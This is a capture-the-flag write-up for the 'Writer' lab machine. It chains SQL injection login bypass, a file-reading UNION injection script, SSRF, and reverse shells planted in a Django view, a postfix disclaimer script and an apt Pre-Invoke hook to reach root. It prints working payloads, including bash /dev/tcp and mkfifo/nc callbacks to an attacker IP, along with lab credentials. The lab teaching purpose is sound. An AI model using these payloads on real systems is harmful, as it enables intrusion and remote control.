## Writer

### Lab Details 

- Difficulty: Medium
- Type: Web App, SQLi, File Upload, LFI,  SSRF,  Priv Esc, Linux

#### Enumeration
- run nmap 
```bash
$ nmap -p- -T4 --min-rate 1000 -sC -A 10.10.11.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 07:43 CDT
Nmap scan report for 10.10.11.101
Host is up (0.0020s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Story Bank | Writer.HTB
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```
- run `ffuf`
```
$ ffuf -u http://writer.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://writer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
<snip>
administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35, Duration: 1213ms]
<snip>
```
- we get a endpoint `administrative`
![[administrative.png]]
#### Initial Foothold 
- we can attempt SQLi on the login form 
- `User Name` is vulnerable to SQLi
- payload `admin' -- -` allow us to login as admin
![[admin dashboard.png]]
 - after going through the web app we found that we can add story to the app
 - we have the option to either upload a file or enter a URL to fetch a file
![[add story.png]]
- we can test for SSRF by intercepting the request with Burpsuite and edit the URL to attacker IP
- e.g. `http://google.com` -> edit in burpsuite to `http://10.10.16.23`
```bash
$ nc -lvnp 80    
listening on [any] 80 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.179.190] 37524
GET /test.jpg HTTP/1.1
Accept-Encoding: identity
Host: 10.10.16.23
User-Agent: Python-urllib/3.8
Connection: close
```
- we get a connection from target
- we can test for `union based SQLi` on the login form since its vulnerable to `SQLi` 
- use below payload to test for the number of columns
```
-- test for 6 columns, still allows login
uname=admin' ORDER BY 6-- -&password=123

-- test for 7 columns, gives error
uname=admin' ORDER BY 7-- -&password=123

```
- we know from above that there are 6 columns in the user table because if we specify `order by 7` we are unable to login
- we can also run `sqlmap` to see what privilege we have over the database

- with that info we can attempt to read files from the server

![[UNION injection.png]]
- we know that the web server is using `apache` from the nmap scan, we can attempt to read the related config files
- first we can check `/etc/apache2/sites-enabled/000-default.conf`
- use below script to download files from remote using `SQLi Union`
```bash
import requests
import sys
import re
import base64

## this line filters out the start and end of the response only gets the file content
regex = re.compile(r"admin(.*)</h3>", re.DOTALL)
## sqli payload
data = {"uname": f"admin' union select 1, TO_BASE64(LOAD_FILE(\"{sys.argv[1]}\")),3,4,5,6-- -", "password": "123"}

r = requests.post("http://writer.htb/administrative", data=data)
match = re.search(regex, r.text)

fname = sys.argv[1].replace("/", "_")[1:]

if match.group(1) != 'None':
    with open ('files/' + fname, 'w') as f:
        output = base64.b64decode(match.group(1) + '=' * (-len(match.group(1)) % 4))
        f.write(output.decode())
```
- output from `000-default.conf` specifies the location of the config files of `WSGI` and we check out that file
```
cat ./files/etc_apache2_sites-enabled_000-default.conf 
# Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
<snip>
```
- in the `wsgi` file it imports the `__init__.py` file
```
$ cat ./files/var_www_writer.htb_writer.wsgi            
#!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/writer.htb/")

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get("SECRET_KEY", "")

```
- in the `__init__.py` file specifies the `mysql` database connection detail
```
<snip>
#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
<snip>
```
- we can reuse the password, and found that we can login to `SMB` as user `kyle` 
```
$ smbclient //writer.htb/writer2_project -U kyle
Password for [WORKGROUP\kyle]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Aug  1 23:52:48 2021
  ..                                  D        0  Tue Jun 22 10:55:06 2021
  static                              D        0  Sun May 16 13:29:16 2021
  staticfiles                         D        0  Fri Jul  9 03:59:42 2021
  writer_web                          D        0  Wed May 19 08:26:18 2021
  requirements.txt                    N       15  Fri Aug 29 23:22:01 2025
  writerv2                            D        0  Wed May 19 05:32:41 2021
  manage.py                           N      806  Fri Aug 29 23:22:01 2025

                7151096 blocks of size 1024. 2495928 blocks available
smb: \> cd writer_web
smb: \writer_web\> ls
  .                                   D        0  Wed May 19 08:26:18 2021
  ..                                  D        0  Sun Aug  1 23:52:48 2021
  apps.py                             N      133  Fri Aug 29 23:22:01 2025
  views.py                            A      181  Fri Aug 29 23:22:01 2025
  __init__.py                         N        0  Fri Aug 29 23:22:01 2025
  urls.py                             N      127  Fri Aug 29 23:22:01 2025
  tests.py                            N       60  Fri Aug 29 23:22:01 2025
  __pycache__                         D        0  Wed May 19 14:06:02 2021
  admin.py                            N       63  Fri Aug 29 23:22:01 2025
  models.py                           N       98  Fri Aug 29 23:22:01 2025
  templates                           D        0  Tue May 18 06:43:07 202
```
- it seems that we have write access over the file `views.py`
```python
from django.shortcuts import render
from django.views.generic import TemplateView

def home_page(request):
    template_name = "index.html"
    return render(request,template_name)
```
- we can attempt to injection `RCE` to the file and attempt to trigger it 
```python
$ cat views.py.old
from django.shortcuts import render
from django.views.generic import TemplateView
import os

def home_page(request):
    os.system("echo -n YmFzaCAtYyAnYmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzQ0NDQgICAwPiYxJw  | base64 -d | bash")
    template_name = "index.html"
    return render(request,template_name)
```
- upload the file back using `put`
- to trigger the `RCE` we will need to use the `SSRF` vulnerability we found earlier
- we need to visit home directory of the application on the `internal port 8080` to trigger the `RCE`
- the application will call `view.py` when it attempts to visit the `/` home directory but we will need to add `/?test.jpg` because the application is filtering the image type 
![[SSRF.png]]
- after sending the request we get a shell from our listener
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.179.190] 42094
bash: cannot set terminal process group (1040): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:~/writer2_project$ whoami
whoami
www-data
```
#### Lateral Movement (If any)
- go through the files we found in settings.py theres database connection info to `Maria DB`
```bash
www-data@writer:~/writer2_project$ cd writerv2
cd writerv2
www-data@writer:~/writer2_project/writerv2$ ls 
ls
__init__.py
__pycache__
settings.py
urls.py
wsgi.py
www-data@writer:~/writer2_project/writerv2$ cat settings.py
<snip>
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
www-data@writer:~/writer2_project/writerv2$ 
<snip>
```
- we need to first spawn an interactive shell
```
www-data@writer:~/writer2_project/writerv2$ python3 -c 'import pty;
```
- then login to `mysql` using the credential found
```
www-data@writer:~/writer2_project/writerv2$ mysql -u djangouser -pDjangoSuperPassword -h localhost
```
- `auth_user` table contains user `kyle`'s password hash
```
MariaDB [dev]> select * from auth_user
select * from auth_user
    -> ;
;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
```
- we can crack it with `hashcat`
```bash
$ hashcat -m 10000 ./kyle  /usr/share/wordlists/rockyou.txt 

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```
- we can `ssh` into target as `kyle` using the cracked password
- check group permissions of user `kyle` , `kyle` is apart of group `filter`
```bash
kyle@writer:~$ groups kyle
kyle : kyle filter smbgroup
```
- looking through the files that the group permits, we find `disclaimer` script
```
kyle@writer:~$ find / -group filter 2>/dev/null
/etc/postfix/disclaimer
/var/spool/filter
```
- it adds a disclaimer at the end of the email, since we have write permission we can inject `RCE` into that script then wait for it to execute
```bash
kyle@writer:/var/spool/filter$ cat ~/disclaimer 
#!/bin/sh
# Localize these.

bash -i >& /dev/tcp/10.10.16.23/9001 0>&1



INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```
- since each time cron job runs it resets the script to default we will need to copy the script to a writable location such as `/home/kyle` then move it to `/etc/postfix/`
```
kyle@writer:/var/spool/filter$ while true; do cp /home/kyle/disclaimer /etc/postfix/disclaimer; sleep 2; done &
[1] 6014
```
- to trigger the `disclaimer` script we will need to send an email specified in `DISCLAIMER_ADDRESSES`
```
# Get disclaimer addresses
# DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

kyle@writer:/var/spool/filter$ cat /etc/postfix/disclaimer_addresses
root@writer.htb
kyle@writer.htb

kyle@writer:/var/spool/filter$ nc localhost 25
220 writer.htb ESMTP Postfix (Ubuntu)
helo locahost
250 writer.htb
helo localhostg
250 writer.htb
helo localhost
250 writer.htb
mail from: <kyle@writer.htb>
250 2.1.0 Ok
rcpt to: <root@writer.htb>
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
aaa
.
250 2.0.0 Ok: queued as EA5807EC
```
- we get a shell as user `john` shortly after sending the email
#### Privilege Escalation
- get the private ssh key of user john and we can ssh using the private key as user `john`
- check the group permission and we see that user `john` is part of the management group which has write permission over `/etc/apt/apt.conf.d
```
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
john@writer:~$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
```
- we can follow `https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/` for privilege escalation
```
john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.23 9002 >/tmp/f"};' > 000PWNED
john@writer:/etc/apt/apt.conf.d$ ls
000PWNED      01-vendor-ubuntu  15update-stamp  20packagekit  50command-not-found  99update-notifier
01autoremove  10periodic        20archive       20snapd.conf  70debconf
john@writer:/etc/apt/apt.conf.d$ cat 000PWNED 
apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.23 9002 >/tmp/f"};
```
- we get shell as root after creating the malicious config file for `apt`
```
$ nc -lvnp 9002  
listening on [any] 9002 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.179.190] 59164
/bin/sh: 0: can't access tty; job control turned off
# ls /root
root.txt
snap
```
#### Resources

#### Lesson Learned
